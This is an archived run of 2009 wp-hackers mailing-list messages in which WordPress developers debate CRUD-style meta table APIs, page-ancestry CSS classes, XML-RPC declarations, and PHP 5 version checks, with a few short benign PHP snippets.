I'm not trying to argue against CRUD, I just wish another pattern or architecture was choosen for WordPress. CRUD is very simple and quick to implement. I just shudder every time I see it within WordPress and within my own code (papa doesn't like spending forever on "proper" design). Therefore, I'm trying to not argue CRUD in a wierd way, but still say it sucks and I very much hate it.

Jacob Santos

On Mon, 27 Jul 2009 03:17:30 +0300
scribu <scribu at gmail.com> wrote:

> On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name>wrote:
> 
> > CRUD in procedural form. Alas, it seems flawed somehow. The look, the feel;
> > The wonder about how to make it better. Is there such a solution?
> >
> > It seems a pity to look at something so beautiful in its simplicity and
> > then ask why? What purpose is there to mock something that should be so
> > clerished and loved and yet not provide another?
> >
> > Not that objects are any better, just better organized. A shame really.
> >
> > I do cry every time I see CRUD.
> >
> > Good work nevertheless. I hope you choose to name the parameters better.
> > There is a concept called, "Self-documenting Code" that is just plain
> > awesome in its beauty and soft skin.
> >
> > Jacob Santos
> >
> 
> 
> Thanks for the comment - very poetic, but not really helpful.
> 
> Don't know how I could rename the parameters to be more self-documenting
> than they already are. Metaphors maybe? :)
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


-- 
Jacob Santos <wordpress at santosj.name>


From mikeschinkel at newclarity.net  Mon Jul 27 02:41:30 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sun, 26 Jul 2009 21:41:30 -0500 (CDT)
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <20090726212420.b9c27ee8.wordpress@santosj.name>
Message-ID: <23071988.3581248662119214.JavaMail.DELL-1405$@Dell-1405>

Jacob,

I'm curious; if CRUD is bad, what is good?

-Mike Schinkel
Custom Wordpress Plugins
http://mikeschinkel.com/custom-wordpress-plugins

----- Original Message -----
From: "Jacob Santos" <wordpress at santosj.name>
To: wp-hackers at lists.automattic.com
Sent: Sunday, July 26, 2009 10:24:20 PM GMT -05:00 US/Canada Eastern
Subject: Re: [wp-hackers] Meta tables: Take 5

Well, I think it is fine, except for object_id doesn't really have an explanation. Why not $id, instead? The problem is that it doesn't explain what the object part is, so it can be anything. It is the ID of the type you are looking for, so post, comment, category, etc. Why not just name it ID and leave out the question of what 'object' means. People understand what ID means.

I'm not trying to argue against CRUD, I just wish another pattern or architecture was choosen for WordPress. CRUD is very simple and quick to implement. I just shudder every time I see it within WordPress and within my own code (papa doesn't like spending forever on "proper" design). Therefore, I'm trying to not argue CRUD in a wierd way, but still say it sucks and I very much hate it.

Jacob Santos

On Mon, 27 Jul 2009 03:17:30 +0300
scribu <scribu at gmail.com> wrote:

> On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name>wrote:
> 
> > CRUD in procedural form. Alas, it seems flawed somehow. The look, the feel;
> > The wonder about how to make it better. Is there such a solution?
> >
> > It seems a pity to look at something so beautiful in its simplicity and
> > then ask why? What purpose is there to mock something that should be so
> > clerished and loved and yet not provide another?
> >
> > Not that objects are any better, just better organized. A shame really.
> >
> > I do cry every time I see CRUD.
> >
> > Good work nevertheless. I hope you choose to name the parameters better.
> > There is a concept called, "Self-documenting Code" that is just plain
> > awesome in its beauty and soft skin.
> >
> > Jacob Santos
> >
> 
> 
> Thanks for the comment - very poetic, but not really helpful.
> 
> Don't know how I could rename the parameters to be more self-documenting
> than they already are. Metaphors maybe? :)
> 
> 
> -- 
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


-- 
Jacob Santos <wordpress at santosj.name>

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From jeremy at visser.name  Mon Jul 27 03:34:14 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Mon, 27 Jul 2009 13:34:14 +1000
Subject: [wp-hackers] what clients send an XML declaration in XML-RPC
 requests?
In-Reply-To: <09C7F87C-4839-4DA2-A4FA-DA70EC44381D@josephscott.org>
References: <09C7F87C-4839-4DA2-A4FA-DA70EC44381D@josephscott.org>
Message-ID: <1248665654.4373.16.camel@rillian.narnia.sunriseroad.net>

On Fri, 2009-07-24 at 16:59 -0600, Joseph Scott wrote:
> To those of you out there that are writing blog clients for WordPress  
> I have a question.  Do you include this declaration at the top of your  
> requests?  If so, is it identical to this one or is it different?

I haven't written a blog client for WordPress, but if I had, I'd also
include a declaration of what encoding is used, like so:

  <?xml version="1.0" encoding="UTF-8"?>


From simon at sweetinteraction.com  Mon Jul 27 06:02:44 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Mon, 27 Jul 2009 07:02:44 +0100
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405> 
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405> 
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com> 
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com> 
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com> 
	<22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
Message-ID: <77c8b7bf0907262302m488e0c7ep31d52e4b32d3f801@mail.gmail.com>

On Sun, Jul 26, 2009 at 9:31 PM, SoJ Web<sojweb at indiana.edu> wrote:
>
> This works fine if the hierarchy is only 2-deep; beyond
> that, however, it fails, because WordPress only adds the
> "current-page-parent" class to a page's immediate parents, and not to the
> parents of the parent.
>

Doesn't it add 'current-page-ancestor' and 'current-page-descendant'?

S


---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From wordpress at santosj.name  Mon Jul 27 07:17:45 2009
From: wordpress at santosj.name (Jacob Santos)
Date: Mon, 27 Jul 2009 02:17:45 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <23071988.3581248662119214.JavaMail.DELL-1405$@Dell-1405>
References: <20090726212420.b9c27ee8.wordpress@santosj.name>
	<23071988.3581248662119214.JavaMail.DELL-1405$@Dell-1405>
Message-ID: <20090727021745.c76c5010.wordpress@santosj.name>

What is good is not requiring the user of the API to realize the DB table scheme or understand how the DB table works. I think the Taxonomy API is a good example, if the whole concept wasn't so difficult to understand in the first place. I think the better solution is to abstract the DB entirely from the API user and build the API that is built on top of it.

The problem I have with CRUD, is that it forces the developer to know the DB scheme or at least understand the scheme. It seems to be taking the easy way out, "Well, I could create an API that doesn't force the developer using the API to know anything about the scheme, but meh, I lika the shiny and don't want to spend too much time developing something."

In my experience, it requires the user of the API to know too much information is not important. Likewise, if the Scheme changes, then the API must change and all code that uses CRUD most change as well. If you are trying to create an API that doesn't require hassling the developer working on the API and the user of the API to keep up with the changes, then why use something that either puts the workload on the user ("Oh crap, the API breaks backward compatibility again because of scheme changes.") or on the developer ("Well, I could make refactor the design to where it doesn't suck, but doing so will either break backwards compatibility or cause me to work around a lot of my previous scheme and coding mistakes.").

As for the proper solution, I've yet to find one that doesn't suffer from similar flaws or new ones. BREAD suffers from the same reasons of CRUD. I've discovered that the architecture should be a layer on top of the DB that abstracts the table scheme as well as any changes. Looking at how WordPress implements wp_insert_post() and wp_update_post(), I can say that that is far better than any design I've seen and have so far implemented. Actually, I have sinced strived to implement my APIs like wp_insert_post() and wp_update_post() in that inserting into tables uses CRUD or BREAD (I'm not so sure ORM or the others are any better or worse, just solves a different problem or the same problem differently).

So the underlying DB implementation uses CRUD or BREAD or whatever pattern or fad everyone is using this year, but the API above it is not. So I suppose what I mean to say is that I'm not in favor of forcing the user of the API to use CRUD, but okay for the developer to do so in order to Get Shit Done and build an API that the user can understand quickly and easily.

I think at the end of the day, if the choice is Getting Shit Done or Getting Shit Done right, which also means never, then I'll choose to have something rather than nothing. Which is why I keep having to kick myself in an attempt to not say anything stupid and take away from something that in all regards is actually pretty kick ass.

Jacob Santos



On Sun, 26 Jul 2009 21:41:30 -0500 (CDT)
Mike Schinkel <mikeschinkel at newclarity.net> wrote:

> Jacob,
> 
> I'm curious; if CRUD is bad, what is good?
> 
> -Mike Schinkel
> Custom Wordpress Plugins
> http://mikeschinkel.com/custom-wordpress-plugins
> 
> ----- Original Message -----
> From: "Jacob Santos" <wordpress at santosj.name>
> To: wp-hackers at lists.automattic.com
> Sent: Sunday, July 26, 2009 10:24:20 PM GMT -05:00 US/Canada Eastern
> Subject: Re: [wp-hackers] Meta tables: Take 5
> 
> Well, I think it is fine, except for object_id doesn't really have an explanation. Why not $id, instead? The problem is that it doesn't explain what the object part is, so it can be anything. It is the ID of the type you are looking for, so post, comment, category, etc. Why not just name it ID and leave out the question of what 'object' means. People understand what ID means.
> 
> I'm not trying to argue against CRUD, I just wish another pattern or architecture was choosen for WordPress. CRUD is very simple and quick to implement. I just shudder every time I see it within WordPress and within my own code (papa doesn't like spending forever on "proper" design). Therefore, I'm trying to not argue CRUD in a wierd way, but still say it sucks and I very much hate it.
> 
> Jacob Santos
> 
> On Mon, 27 Jul 2009 03:17:30 +0300
> scribu <scribu at gmail.com> wrote:
> 
> > On Mon, Jul 27, 2009 at 12:21 AM, Jacob Santos <wordpress at santosj.name>wrote:
> > 
> > > CRUD in procedural form. Alas, it seems flawed somehow. The look, the feel;
> > > The wonder about how to make it better. Is there such a solution?
> > >
> > > It seems a pity to look at something so beautiful in its simplicity and
> > > then ask why? What purpose is there to mock something that should be so
> > > clerished and loved and yet not provide another?
> > >
> > > Not that objects are any better, just better organized. A shame really.
> > >
> > > I do cry every time I see CRUD.
> > >
> > > Good work nevertheless. I hope you choose to name the parameters better.
> > > There is a concept called, "Self-documenting Code" that is just plain
> > > awesome in its beauty and soft skin.
> > >
> > > Jacob Santos
> > >
> > 
> > 
> > Thanks for the comment - very poetic, but not really helpful.
> > 
> > Don't know how I could rename the parameters to be more self-documenting
> > than they already are. Metaphors maybe? :)
> > 
> > 
> > -- 
> > http://scribu.net
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> 
> 
> -- 
> Jacob Santos <wordpress at santosj.name>
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


-- 
Jacob Santos <wordpress at santosj.name>


From scribu at gmail.com  Mon Jul 27 11:42:37 2009
From: scribu at gmail.com (scribu)
Date: Mon, 27 Jul 2009 14:42:37 +0300
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <20090726212420.b9c27ee8.wordpress@santosj.name>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<20090726162155.d743ff96.wordpress@santosj.name>
	<349fe48b0907261717y11978be3h8105d0f82995e47a@mail.gmail.com>
	<20090726212420.b9c27ee8.wordpress@santosj.name>
Message-ID: <349fe48b0907270442w2c9df133iaaa0180c792591bc@mail.gmail.com>

On Mon, Jul 27, 2009 at 5:24 AM, Jacob Santos <wordpress at santosj.name>wrote:

> Well, I think it is fine, except for object_id doesn't really have an
> explanation. Why not $id, instead? The problem is that it doesn't explain
> what the object part is, so it can be anything. It is the ID of the type you
> are looking for, so post, comment, category, etc. Why not just name it ID
> and leave out the question of what 'object' means. People understand what ID
> means.



I named it object_id because it was supposed to replace post_id and user_id.

wp_term_relationships also uses object_id.

The only tables that use ID are wp_posts and wp_users.

So object_id seemed more consistent. Anyway, let's not bikeshed about this
topic any further.


-- 
http://scribu.net

From sojweb at indiana.edu  Mon Jul 27 12:04:33 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Mon, 27 Jul 2009 08:04:33 -0400
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <77c8b7bf0907262302m488e0c7ep31d52e4b32d3f801@mail.gmail.com>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405>
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405>
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com>
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com>
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com>
	<22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
	<77c8b7bf0907262302m488e0c7ep31d52e4b32d3f801@mail.gmail.com>
Message-ID: <9126C740-D1F3-4618-8B12-AA5DDF2CDF0E@indiana.edu>

Not that I'm aware of... is it supposed to?

-Jeff


On Jul 27, 2009, at 2:02 AM, Simon Wheatley wrote:

> On Sun, Jul 26, 2009 at 9:31 PM, SoJ Web<sojweb at indiana.edu> wrote:
>>
>> This works fine if the hierarchy is only 2-deep; beyond
>> that, however, it fails, because WordPress only adds the
>> "current-page-parent" class to a page's immediate parents, and not  
>> to the
>> parents of the parent.
>>
>
> Doesn't it add 'current-page-ancestor' and 'current-page-descendant'?
>
> S
>
>
> ---
> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
> Registered office: 7 Malton Av, Manchester, M21 8AT
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp-hackers at striderweb.com  Mon Jul 27 12:49:36 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Mon, 27 Jul 2009 07:49:36 -0500
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <30786C43-7F5B-4028-BFD2-A7EACA75BCFC@indiana.edu>
References: <30786C43-7F5B-4028-BFD2-A7EACA75BCFC@indiana.edu>
Message-ID: <8F1FE70F-8837-497F-BE79-B2F3D721AC3A@striderweb.com>

Still the wrong way to do it.  Don't start a new thread by replying to  
an existing thread.  Just create a new message.

Otherwise those of us who view their emails threaded end up with your  
thread and the other one intermingled.  It's messy, and anyone who is  
ignoring that original thread will probably not see your thread either.

Stephen

On Jul 26, 2009, at 3:34 PM, SoJ Web wrote:

> Crap, my question is not related scribu's message... I just forgot  
> to delete that part out before I sent. My bad :-).


From sojweb at indiana.edu  Mon Jul 27 12:56:31 2009
From: sojweb at indiana.edu (SoJ Web)
Date: Mon, 27 Jul 2009 08:56:31 -0400
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <8F1FE70F-8837-497F-BE79-B2F3D721AC3A@striderweb.com>
References: <30786C43-7F5B-4028-BFD2-A7EACA75BCFC@indiana.edu>
	<8F1FE70F-8837-497F-BE79-B2F3D721AC3A@striderweb.com>
Message-ID: <250E072E-B6B6-4AD0-BF90-455667CC4BD4@indiana.edu>

Right on. Thanks for the heads up.


-Jeff


On Jul 27, 2009, at 8:49 AM, Stephen Rider wrote:

> Still the wrong way to do it.  Don't start a new thread by replying  
> to an existing thread.  Just create a new message.
>
> Otherwise those of us who view their emails threaded end up with  
> your thread and the other one intermingled.  It's messy, and anyone  
> who is ignoring that original thread will probably not see your  
> thread either.
>
> Stephen
>
> On Jul 26, 2009, at 3:34 PM, SoJ Web wrote:
>
>> Crap, my question is not related scribu's message... I just forgot  
>> to delete that part out before I sent. My bad :-).
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From simon at sweetinteraction.com  Mon Jul 27 13:16:41 2009
From: simon at sweetinteraction.com (Simon Wheatley)
Date: Mon, 27 Jul 2009 14:16:41 +0100
Subject: [wp-hackers] Page ancestry and CSS
In-Reply-To: <9126C740-D1F3-4618-8B12-AA5DDF2CDF0E@indiana.edu>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405> 
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405> 
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com> 
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com> 
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
	<349fe48b0907251712m2e0d0f20y6485f84aaea442e8@mail.gmail.com> 
	<22A3E908-82CD-4BFA-80EC-D674BBA93EBA@indiana.edu>
	<77c8b7bf0907262302m488e0c7ep31d52e4b32d3f801@mail.gmail.com> 
	<9126C740-D1F3-4618-8B12-AA5DDF2CDF0E@indiana.edu>
Message-ID: <77c8b7bf0907270616q20da4e2ao2c8aae7d6d0f4d22@mail.gmail.com>

Should do in 2.8, I think. Check out the start_el method of class
Walker_Page in wp-includes/classes.php for how/where it's doing it.

Try making a page structure and check out the CSS classes on the LI elements.

S


On Mon, Jul 27, 2009 at 1:04 PM, SoJ Web<sojweb at indiana.edu> wrote:
> Not that I'm aware of... is it supposed to?
>
> -Jeff
>
>
> On Jul 27, 2009, at 2:02 AM, Simon Wheatley wrote:
>
>> On Sun, Jul 26, 2009 at 9:31 PM, SoJ Web<sojweb at indiana.edu> wrote:
>>>
>>> This works fine if the hierarchy is only 2-deep; beyond
>>> that, however, it fails, because WordPress only adds the
>>> "current-page-parent" class to a page's immediate parents, and not to the
>>> parents of the parent.
>>>
>>
>> Doesn't it add 'current-page-ancestor' and 'current-page-descendant'?
>>
>> S
>>
>>
>> ---
>> Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
>> Registered office: 7 Malton Av, Manchester, M21 8AT
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Simon Wheatley
Sweet Interaction Ltd
Web Interaction Design & Development
Tel: 07971 687295

Consulting for Stephen Fry: http://stephenfry.com/
Blog functionality for DfID - http://blogs.dfid.gov.uk/
House of Illustration site - http://houseofillustration.org.uk/
Blog for the Royal Navy - http://jackspeak.royalnavy.mod.uk/

---
Sweet Interaction Ltd is Registered in England/Wales, no. 6610741
Registered office: 7 Malton Av, Manchester, M21 8AT

From otto at ottodestruct.com  Mon Jul 27 13:20:52 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 27 Jul 2009 08:20:52 -0500
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
References: <11433250.2631248469157152.JavaMail.DELL-1405$@Dell-1405> 
	<19137721.2881248470921899.JavaMail.DELL-1405$@Dell-1405> 
	<349fe48b0907241450o13cb3959n749bc95666408474@mail.gmail.com> 
	<161617690907242229o6c31537dse4f91d6f229aa8f3@mail.gmail.com> 
	<8D058DCB-325B-4E1F-90E5-444E44E75691@newclarity.net>
Message-ID: <161617690907270620p3c336bbfwd254a201c0e288a@mail.gmail.com>

On Sat, Jul 25, 2009 at 1:48 AM, Mike
Schinkel<mikeschinkel at newclarity.net> wrote:
> That comfort comes with less than trivial performance implications.
> ...
> Now, let's look the option we'd choose it we didn't challenge the default
> assumptions: VARCHAR(255)..

Why so large? I was thinking CHAR(20) at most.

-Otto

From otto at ottodestruct.com  Mon Jul 27 13:30:25 2009
From: otto at ottodestruct.com (Otto)
Date: Mon, 27 Jul 2009 08:30:25 -0500
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com> 
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com> 
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com> 
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com> 
	<4A6B5C42.2090100@intraffic.net>
	<eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>
Message-ID: <161617690907270630u52a7c706q6fdf8ce4c8c393c3@mail.gmail.com>

On Sat, Jul 25, 2009 at 3:49 PM, Jordi Canals<jordi at jcanals.net> wrote:
> 2009/7/25 Jason Webster <jason at intraffic.net>
>
>> On 20/07/2009 6:20 AM, Otto wrote:
>>
>> ?That will run fine. PHP only will throw an error if it actually makes
>>> it to the code. Code is interpreted at the time of execution, not at
>>> the time of inclusion. You can include a file with complete gibberish
>>> inside a function, but until you try to use that function, it won't
>>> stop the program.
>>>
>>> -Otto
>>>
>>
>> That is SO not true.

Fine, let me rephrase.

As long as it is syntactically valid code, the parser won't throw up
on it when turning it into bytecode. It doesn't have to be actual
executable code, just valid enough that it can be parsed as PHP code.

So your example won't work because the code is not correct syntax. On
the other hand, this:

test.php:
<?php
function complete_gibberish() {
    this_is_complete_gibberish($full_of_all_sorts_of_errors);
}
echo 'hi';

Works just fine. Even though it's calling an undefined function inside
that function.

Thus, having PHP 5 only code inside the file is fine, as it's got to
be syntactically valid anyway. Having it in a separate file that you
include is overkill.

-Otto

From shane at bugssite.org  Mon Jul 27 13:41:14 2009
From: shane at bugssite.org (Shane A. Froebel)
Date: Mon, 27 Jul 2009 09:41:14 -0400
Subject: [wp-hackers] readme.txt: "Requires PHP 5 tag"
In-Reply-To: <eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>
References: <4A5CC0EE.6060102@elektroelch.de>
	<161617690907141341m66942ab7oec6136bad31d83c8@mail.gmail.com>
	<7B0C0AEB-014C-4A84-BD1C-64673927522D@googlemail.com>
	<161617690907171429m3b81f37fp70eafebc974b7283@mail.gmail.com>
	<4A613671.8090104@gaarai.com> <4A613742.2040206@xavisys.com>
	<161617690907200620i7250dcd0j36429c0c9c4174ce@mail.gmail.com>
	<4A6B5C42.2090100@intraffic.net>
	<eccf48430907251349t35e3dae6pc7082ce8f88434a9@mail.gmail.com>
Message-ID: <4A6DAE7A.1050601@bugssite.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Just to make it clear (from
http://us2.php.net/manual/en/function.version-compare.php)

if (version_compare(PHP_VERSION, '5.0.0', '>')) {
    echo 'I am using PHP 5, my version: ' . PHP_VERSION . "\n";
}

if (version_compare(PHP_VERSION, '5.0.0', '<')) {
    echo 'I am using PHP 4, my version: ' . PHP_VERSION . "\n";
}

Jordi Canals wrote:
> 2009/7/25 Jason Webster <jason at intraffic.net>
> 
>> On 20/07/2009 6:20 AM, Otto wrote:
>>
>>  That will run fine. PHP only will throw an error if it actually makes
>>> it to the code. Code is interpreted at the time of execution, not at
>>> the time of inclusion. You can include a file with complete gibberish
>>> inside a function, but until you try to use that function, it won't
>>> stop the program.
>>>
>>> -Otto
>>>
>> That is SO not true.
>>
>> test.php:
>> <?php
>>
>> function complete_gibberish() {
>>    this is complete gibberish
>>    full of all sorts of syntax errors
>> }
>>
>>
>> echo 'hi';
>>
>>
>> $: php test.php
>>> PHP Parse error:  syntax error, unexpected T_STRING in
>> /home/jason/test.php on line 4
>>
>>
>>From PHP-4, the file is parsed when loaded, so syntax in all file is checked
> as soon as the file has been included. It does not mind if the code is
> executed or not, Steps are like that: 1) File is loaded, 2) File is parsed
> and compiled and 3) The code is executed.
> 
> So, the best way is to have a small file to check for the version prior to
> including any version specific version code, you can do with a file like
> that:
> 
> <?php
> if ( version_compare(PHP_VERSION, '5.0.0', '<') {
>    die ( "PHP 5 is required to run this script");
> } else {
>    include 'filename.php';
> }
> ?>
> 
> Regards,
> ---
> 
> Jordi Canals
> http://alkivia.org
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/

iQIcBAEBAgAGBQJKba55AAoJEC7/vS6gbNwFvwMP/jjv/8M/B+cucjbDT1UDuHdX
H93bUvhTVHD0te3I3+WjGw8mjDRh7gpgXhvXfwEwFBjcDE6e5lUnozL4IB+pKP7+
Dw0Cw6TuzSK4Be0wC1P1BAXl/chhE1QiHuXC+LJojqxVuOTlX8Eso/dRMQh1MpuT
gvwDwOS2q9LbgzAJA4YjnvaSZO9sjVAgA4t7igvSaJ/n8Wylby+f3U5Tc9BMzCXA
ONCu5G6Qk9ab7/buq9c1fa9o+Q8WG2nzr4FUEIW4RUOwtCEmO7IJRTCpaVlvK1az
acJJ+aBatHsQE1PpPsTBTlHfsMdhrnzHaI98AWYzJjkpwwefa2Q6Koie6paew8l/
5wy2AcM8Zw/ADE3cFwyVnFNbGvgK3ZDdDuvQxoU26hcm9zEpMu6t3X6a7NtNssC6
UeJnEtfNp0LriH/CUEnFgjp3QYnDSfAYmVJg5nys0DRijyV1MCg2yepzAlDeoWk/
5MuFzjPjVqvVnjGcCGY3ym+Xu2BeKAOblnFflP+4RBK5eHpuAiNUvWPR/gL+xC8s
dcIZCxPjHjTCMJkrzll67Ur9hTPZl2hZxZbIlri6ZIasTw3q/x/1j8AxRKagvRPz
3hQI6GN0GtJ+VMg9aS9ka89CxbAXfJWvnSBairU6bEYOuDUQJ99KHI0Lmu608Ey3
2jc98Y91hOwfRmZ09l6U
=O0zC
-----END PGP SIGNATURE-----

From mikeschinkel at newclarity.net  Mon Jul 27 14:57:03 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Mon, 27 Jul 2009 10:57:03 -0400
Subject: [wp-hackers] Meta tables: Take 5
In-Reply-To: <20090727021745.c76c5010.wordpress@santosj.name>
References: <20090726212420.b9c27ee8.wordpress@santosj.name>
	<23071988.3581248662119214.JavaMail.DELL-1405$@Dell-1405>
	<20090727021745.c76c5010.wordpress@santosj.name>
Message-ID: <CEE6989D-B290-4447-B49D-949E2427515E@newclarity.net>

Thanks for that long answer, but I still did not hear a viable  
alternate to CRUD, only some hypothetical panacea.

In my development experience (which spans 20 years now) I've gone from  
strong believing in abstracted solutions to learned belief that  
abstraction for abstraction sake is bad and it's better to stay closer  
to the metal unless and until a true pattern emerges. When that  
pattern dies, it should ideally implement in the language (i.e. the  
"foreach" iteration pattern vs. "for" with counter variables) or it  
that can't happen then in language's library or lastly in a framework  
like WordPress' core.  As far as I can see, the only true pattern  
visible is CRUD.  Something better may come along but I have yet to  
see it.

Simpler is better.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/




On Jul 27, 2009, at 3:17 AM, Jacob Santos wrote:

> What is good is not requiring the user of the API to realize the DB  
> table scheme or understand how the DB table works. I think the  
> Taxonomy API is a good example, if the whole concept wasn't so  
> difficult to understand in the first place. I think the better  
> solution is to abstract the DB entirely from the API user and build  
> the API that is built on top of it.
>
> The problem I have with CRUD, is that it forces the developer to  
> know the DB scheme or at least understand the scheme. It seems to be  
> taking the easy way out, "Well, I could create an API that doesn't  
> force the developer using the API to know anything about the scheme,  
> but meh, I lika the shiny and don't want to spend too much time  
> developing something."
>
> In my experience, it requires the user of the API to know too much  
> information is not important. Likewise, if the Scheme changes, then  
> the API must change and all code that uses CRUD most change as well.  
> If you are trying to create an API that doesn't require hassling the  
> developer working on the API and the user of the API to keep up with  
> the changes, then why use something that either puts the workload on  
> the user ("Oh crap, the API breaks backward compatibility again  
> because of scheme changes.") or on the developer ("Well, I could  
> make refactor the design to where it doesn't suck, but doing so will  
> either break backwards compatibility or cause me to work around a  
> lot of my previous scheme and coding mistakes.").
>
> As for the proper solution, I've yet to find one that doesn't suffer  
> from similar flaws or new ones. BREAD suffers from the same reasons  
> of CRUD. I've discovered that the architecture should be a layer on  
> top of the DB that abstracts the table scheme as well as any  
> changes. Looking at how WordPress implements wp_insert_post() and  
> wp_update_post(), I can say that that is far better than any design  
> I've seen and have so far implemented. Actually, I have sinced  
> strived to implement my APIs like wp_insert_post() and  
> wp_update_post() in that inserting into tables uses CRUD or BREAD  
> (I'm not so sure ORM or the others are any better or worse, just  
> solves a different problem or the same problem differently).
>
> So the underlying DB implementation uses CRUD or BREAD or whatever  
> pattern or fad everyone is using this year, but the API above it is  
> not. So I suppose what I mean to say is that I'm not in favor of  
> forcing the user of the API to use CRUD, but okay for the developer  
> to do so in order to Get Shit Done and build an API that the user  
> can understand quickly and easily.
>
> I think at the end of the day, if the choice is Getting Shit Done or  
> Getting Shit Done right, which also means never, then I'll choose to  
> have something rather than nothing. Which is why I keep having to  
> kick myself in an attempt to not say anything stupid and take away  
> from something that in all regards is actually pretty kick ass.
>
> Jacob Santos
>
>
>
> On Sun, 26 Jul 2009 21:41:30 -0500 (CDT)
> Mike Schinkel <mikeschinkel at newclarity.net> wrote:
>
>> Jacob,
>>
>> I'm curious; if CRUD is bad, what is good?
>>
>> -Mike Schinkel
>> Custom Wordpress Plugins
>> http://mikeschinkel.com/custom-wordpress-plugins
>>
>> ----- Original Message -----
>> From: "Jacob Santos" <wordpress at santosj.name>
>> To: wp-hackers at lists.automattic.com
>> Sent: Sunday, July 26, 2009 10:24:20 PM GMT -05:00 US/Canada Eastern
>> Subject: Re: [wp-hackers] Meta tables: Take 5
>>
>> Well, I think it is fine, except for object_id doesn't really have  
